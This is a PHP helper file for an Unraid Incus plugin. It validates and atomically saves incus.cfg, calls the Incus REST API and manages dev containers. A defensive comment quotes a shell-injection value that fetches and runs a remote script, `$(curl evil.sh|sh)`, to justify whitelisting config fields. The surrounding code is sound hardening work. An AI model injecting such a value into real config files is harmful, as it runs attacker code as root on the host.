<?php
/**
 * Shared helpers for the Incus plugin webGUI: incus.cfg load/save and a thin
 * client for the Incus REST API over its local unix socket. Mirrors
 * unraid-api-plugin-incus/src/incus.service.ts (same API-first approach, no
 * CLI scraping) so the classic webGUI and the NestJS/GraphQL plugin agree.
 */

define('INCUS_CFG_PATH', '/boot/config/plugins/incus/incus.cfg');
define('INCUS_CFG_LOCK_PATH', INCUS_CFG_PATH . '.lock');
define('INCUS_CFG_LOCK_STALE_SECONDS', 15);
define('INCUS_CFG_LOCK_TIMEOUT_SECONDS', 3);

/** Parse incus.cfg (KEY="VALUE" shell format) into an assoc array. */
function incus_load_cfg(): array {
    $cfg = [];
    if (!is_file(INCUS_CFG_PATH)) {
        return $cfg;
    }
    foreach (file(INCUS_CFG_PATH, FILE_IGNORE_NEW_LINES) as $line) {
        $line = trim($line);
        if ($line === '' || $line[0] === '#') continue;
        if (!preg_match('/^([A-Z_][A-Z0-9_]*)=(.*)$/', $line, $m)) continue;
        $val = trim($m[2]);
        if (preg_match('/^"([^"]*)"/', $val, $vm) || preg_match("/^'([^']*)'/", $val, $vm)) {
            // Quoted value: take exactly what's between the quotes, ignore any trailing comment.
            $val = $vm[1];
        } else {
            // Unquoted value: strip a trailing " # comment" if present.
            $hashIdx = strpos($val, '#');
            if ($hashIdx !== false) {
                $val = rtrim(substr($val, 0, $hashIdx));
            }
        }
        $cfg[$m[1]] = $val;
    }
    return $cfg;
}

/** Read a boolean-ish cfg value (true|enabled|1|yes all count as true). */
function incus_cfg_bool(array $cfg, string $key, bool $default): bool {
    if (!isset($cfg[$key]) || $cfg[$key] === '') return $default;
    return in_array(strtolower($cfg[$key]), ['true', 'enabled', '1', 'yes'], true);
}

/**
 * Whitelist patterns for free-text incus.cfg values that get `. "$CFG"`-sourced
 * as bash on every array start (incus-init.sh) — an unvalidated value like
 * `$(curl evil.sh|sh)` would silently execute as root on the next boot. CPU
 * and MEMORY also accept an empty string (documented in incus.cfg as "no cap").
 * Returns null for keys with no registered pattern (caller decides what to do).
 *
 * IMPORTANT: incus-init.sh also sources several other free-text/shell-interpolated
 * keys not listed here (DEVCONTAINER_BRIDGE, DEVCONTAINER_WORKSPACE_ROOT,
 * DEVCONTAINER_AGENT_UID/GID, DEVCONTAINER_NESTING, the subnet/NAT/IPv6 keys) —
 * this whitelist only covers the fields UpdateSettings.php currently exposes via
 * POST. If a new field is ever made settable from the webGUI, a matching pattern
 * MUST be added here first; nothing enforces that pairing automatically, and
 * skipping it silently reopens the shell-injection risk this whitelist exists
 * to close.
 */
function incus_cfg_field_pattern(string $key): ?string {
    $patterns = [
        'DEVCONTAINER_IMAGE'   => '/^[A-Za-z0-9:\/_.-]{1,255}$/',
        'DEVCONTAINER_PROFILE' => '/^[A-Za-z0-9:\/_.-]{1,255}$/',
        'DEVCONTAINER_CPU'     => '/^(|\d{1,4})$/',
        'DEVCONTAINER_MEMORY'  => '/^(|\d+(\.\d+)?(B|KiB|MiB|GiB|TiB))$/',
    ];
    return $patterns[$key] ?? null;
}

/**
 * Validate a value against its field's whitelist pattern. Keys with no
 * registered pattern are treated as valid (nothing free-text is written to
 * incus.cfg outside the fields above today).
 */
function incus_validate_cfg_field(string $key, string $value): bool {
    $pattern = incus_cfg_field_pattern($key);
    if ($pattern === null) return true;
    return preg_match($pattern, $value) === 1;
}

/**
 * Best-effort cross-process mutex for incus.cfg writes, shared by this PHP
 * webGUI, the .plg installer's migration step (bash), and the Node config-sync
 * watcher (IncusConfigSyncService) — none of those three runtimes can share a
 * real kernel flock() without a native addon, so all three cooperate through
 * this same sentinel-file protocol instead: atomic exclusive create, a stale
 * timeout so a crashed holder can't wedge things forever, delete-on-release.
 * Never blocks indefinitely — a settings save should not hang the webGUI.
 */
function incus_cfg_lock_acquire(): ?string {
    $token = getmypid() . '-' . bin2hex(random_bytes(4));
    $deadline = microtime(true) + INCUS_CFG_LOCK_TIMEOUT_SECONDS;
    while (microtime(true) < $deadline) {
        $fp = @fopen(INCUS_CFG_LOCK_PATH, 'x');
        if ($fp !== false) {
            fwrite($fp, $token);
            fclose($fp);
            return $token;
        }
        $mtime = @filemtime(INCUS_CFG_LOCK_PATH);
        if ($mtime !== false && (time() - $mtime) > INCUS_CFG_LOCK_STALE_SECONDS) {
            error_log('incus: stealing stale incus.cfg lock (holder likely crashed)');
            @unlink(INCUS_CFG_LOCK_PATH);
            continue;
        }
        usleep(50_000);
    }
    error_log('incus: could not acquire incus.cfg lock within ' . INCUS_CFG_LOCK_TIMEOUT_SECONDS . 's; proceeding without it');
    return null; // proceed without the lock rather than hang the request
}

function incus_cfg_lock_release(?string $token): void {
    if ($token === null) return;
    if (@file_get_contents(INCUS_CFG_LOCK_PATH) === $token) {
        @unlink(INCUS_CFG_LOCK_PATH);
    }
}

/**
 * Update one or more keys in incus.cfg in place, preserving comments/order/
 * untouched lines (mirrors updateShellConfig() in
 * unraid-api-plugin-incus/src/config-sync.service.ts). Keys not already
 * present are appended so upgrades pick up new defaults. Locked for the full
 * read-modify-write (see incus_cfg_lock_acquire) and written atomically
 * (temp file + rename) so a concurrent reader never sees a torn file.
 *
 * Defense in depth: any value containing a double quote or newline is
 * dropped from the update rather than written, since it would corrupt the
 * KEY="VALUE" line format — callers (e.g. UpdateSettings.php) should already
 * be validating with incus_validate_cfg_field(), this is a backstop. Dropped
 * keys are reported back (not just silently discarded) so a validation gap
 * upstream still surfaces to the admin instead of vanishing.
 *
 * @return array{ok: bool, dropped: string[]} ok=false means the write itself
 *   failed (file missing/unwritable, or the temp-write/rename step failed) —
 *   distinct from "nothing needed saving". dropped lists any keys rejected by
 *   the quote/newline backstop above.
 */
function incus_save_cfg(array $updates): array {
    $dropped = [];
    foreach ($updates as $key => $val) {
        if (strpbrk((string) $val, "\"\r\n") !== false) {
            $dropped[] = $key;
            unset($updates[$key]);
        }
    }
    if (empty($updates)) {
        return ['ok' => true, 'dropped' => $dropped]; // nothing left to do, not a failure
    }
    if (!is_file(INCUS_CFG_PATH) || !is_writable(INCUS_CFG_PATH)) {
        error_log('incus: cannot save incus.cfg — missing or not writable at ' . INCUS_CFG_PATH);
        return ['ok' => false, 'dropped' => $dropped];
    }

    $lockToken = incus_cfg_lock_acquire();
    try {
        $lines = file(INCUS_CFG_PATH, FILE_IGNORE_NEW_LINES);
        $seen = [];
        foreach ($lines as $i => $line) {
            $trimmed = trim($line);
            if ($trimmed === '' || $trimmed[0] === '#') continue;
            if (!preg_match('/^([A-Z_][A-Z0-9_]*)=/', $trimmed, $m)) continue;
            $key = $m[1];
            if (array_key_exists($key, $updates)) {
                // Preserve a trailing inline comment, if the original line had one.
                // Quote-aware so a '#' inside the (old) quoted value isn't mistaken for one.
                $rhs = trim(substr($trimmed, strlen($key) + 1));
                $comment = '';
                if (preg_match('/^(?:"[^"]*"|\'[^\']*\'|[^#\s]+)\s*(#.*)$/', $rhs, $cm)) {
                    $comment = ' ' . $cm[1];
                }
                $lines[$i] = $key . '="' . $updates[$key] . '"' . $comment;
                $seen[$key] = true;
            }
        }
        foreach ($updates as $key => $val) {
            if (empty($seen[$key])) {
                $lines[] = $key . '="' . $val . '"';
            }
        }

        $tmpPath = INCUS_CFG_PATH . '.tmp-' . getmypid();
        if (file_put_contents($tmpPath, implode("\n", $lines) . "\n") === false) {
            error_log('incus: failed writing temp file for incus.cfg save at ' . $tmpPath);
            return ['ok' => false, 'dropped' => $dropped];
        }
        if (!rename($tmpPath, INCUS_CFG_PATH)) {
            error_log('incus: failed renaming temp file over incus.cfg');
            return ['ok' => false, 'dropped' => $dropped];
        }
        return ['ok' => true, 'dropped' => $dropped];
    } finally {
        incus_cfg_lock_release($lockToken);
    }
}

/** Low-level call against the Incus REST API over its unix socket. */
function incus_api(string $method, string $path, ?array $body = null): array {
    $cfg = incus_load_cfg();
    $stateDir = $cfg['INCUS_DIR'] ?? '/mnt/user/appdata/incus';
    $socket = rtrim($stateDir, '/') . '/unix.socket';

    if (!file_exists($socket)) {
        return ['ok' => false, 'error' => "incusd socket not found at {$socket}"];
    }

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_UNIX_SOCKET_PATH => $socket,
        CURLOPT_URL => 'http://unix' . $path,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    ]);
    if ($body !== null) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($body));
    }
    $raw = curl_exec($ch);
    $err = curl_error($ch);

    if ($raw === false) {
        return ['ok' => false, 'error' => "incusd unreachable: {$err}"];
    }
    $parsed = json_decode($raw, true);
    if (!is_array($parsed)) {
        return ['ok' => false, 'error' => 'invalid response from incusd'];
    }
    if (($parsed['type'] ?? null) === 'error') {
        return ['ok' => false, 'error' => $parsed['error'] ?? 'unknown incusd error'];
    }
    return [
        'ok' => true,
        'type' => $parsed['type'] ?? 'sync',
        'operation' => $parsed['operation'] ?? null,
        'metadata' => $parsed['metadata'] ?? null,
    ];
}

/** Wait for an Incus async operation to complete (mirrors waitForOperation() in incus.service.ts). */
function incus_wait_operation(string $operationUrl, int $timeoutSec = 60): array {
    $resp = incus_api('GET', "{$operationUrl}/wait?timeout={$timeoutSec}");
    if (!$resp['ok']) return $resp;
    if (($resp['metadata']['status'] ?? null) === 'Failure') {
        return ['ok' => false, 'error' => 'Incus operation failed: ' . ($resp['metadata']['err'] ?? 'unknown error')];
    }
    return ['ok' => true, 'metadata' => $resp['metadata']];
}

/**
 * Run an Incus API call and wait for it to finish if it returned an async
 * operation (mirrors callAndWait() in incus.service.ts). Without this, a
 * PUT .../state or DELETE can return before the container has actually
 * stopped/been removed, letting a caller race ahead (e.g. deleting before a
 * stop has really taken effect).
 */
function incus_api_and_wait(string $method, string $path, ?array $body = null): array {
    $resp = incus_api($method, $path, $body);
    if ($resp['ok'] && ($resp['type'] ?? null) === 'async' && !empty($resp['operation'])) {
        return incus_wait_operation($resp['operation']);
    }
    return $resp;
}

/** GET /1.0 — is incusd reachable? */
function incus_ping(): bool {
    $resp = incus_api('GET', '/1.0');
    return (bool) ($resp['ok'] ?? false);
}

/** List dev containers (instances), same shape as IncusService.listDevContainers(). */
function incus_list_dev_containers(): array {
    $resp = incus_api('GET', '/1.0/instances?recursion=2');
    if (!$resp['ok']) return [];
    $containers = [];
    foreach ($resp['metadata'] ?? [] as $inst) {
        $ipv4 = null;
        foreach ($inst['state']['network']['eth0']['addresses'] ?? [] as $addr) {
            if (($addr['family'] ?? '') === 'inet') { $ipv4 = $addr['address']; break; }
        }
        $containers[] = [
            'name' => $inst['name'] ?? '',
            'status' => $inst['status'] ?? 'Unknown',
            'ipv4' => $ipv4,
        ];
    }
    return $containers;
}

/**
 * Incus instance-name rule: lowercase/uppercase letters, digits, hyphens;
 * must start with a letter; max 63 chars (DNS label limit — Incus uses the
 * name as a hostname). Validating client-side gives a clear error instead of
 * an opaque Incus-side rejection.
 */
function incus_validate_dev_container_name(string $name): bool {
    return preg_match('/^[A-Za-z][A-Za-z0-9-]{0,62}$/', $name) === 1;
}

/** start | stop | restart | freeze | unfreeze. Waits for the underlying Incus operation to finish. */
function incus_set_dev_container_state(string $name, string $action): array {
    $allowed = ['start', 'stop', 'restart', 'freeze', 'unfreeze'];
    if (!in_array($action, $allowed, true)) {
        return ['ok' => false, 'error' => 'invalid action'];
    }
    if (!incus_validate_dev_container_name($name)) {
        return ['ok' => false, 'error' => 'invalid dev container name'];
    }
    return incus_api_and_wait('PUT', '/1.0/instances/' . rawurlencode($name) . '/state', [
        'action' => $action,
        'timeout' => $action === 'stop' ? 30 : 15,
        'force' => $action === 'stop',
    ]);
}

/**
 * Best-effort stop, then delete (mirrors deleteDevContainer() in incus.service.ts).
 * The stop is waited-on so the container is actually stopped before the
 * DELETE is issued, not just "a stop request was sent" — otherwise DELETE
 * can race a still-shutting-down container. The stop's result is ignored on
 * purpose: the container may already be stopped or gone, and DELETE will
 * surface a clear error itself if it truly can't proceed.
 */
function incus_delete_dev_container(string $name): array {
    if (!incus_validate_dev_container_name($name)) {
        return ['ok' => false, 'error' => 'invalid dev container name'];
    }
    incus_set_dev_container_state($name, 'stop');
    return incus_api_and_wait('DELETE', '/1.0/instances/' . rawurlencode($name));
}

/**
 * Bail with a 403 JSON error unless the request carries a valid Unraid CSRF
 * token as a POST field. GET is intentionally not accepted: nothing in this
 * plugin ever sends the token that way, and accepting it would let the token
 * leak into server logs / the Referer header for no functional benefit.
 */
function incus_require_csrf(): void {
    $expected = $GLOBALS['var']['csrf_token'] ?? null;
    $actual = $_POST['csrf_token'] ?? null;
    if (!$expected || !$actual || !hash_equals($expected, $actual)) {
        http_response_code(403);
        header('Content-Type: application/json');
        die(json_encode(['ok' => false, 'error' => 'CSRF check failed']));
    }
}

/** Bail with a 405 JSON error unless the request method is POST. */
function incus_require_post(): void {
    if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
        http_response_code(405);
        header('Content-Type: application/json');
        die(json_encode(['ok' => false, 'error' => 'POST required']));
    }
}
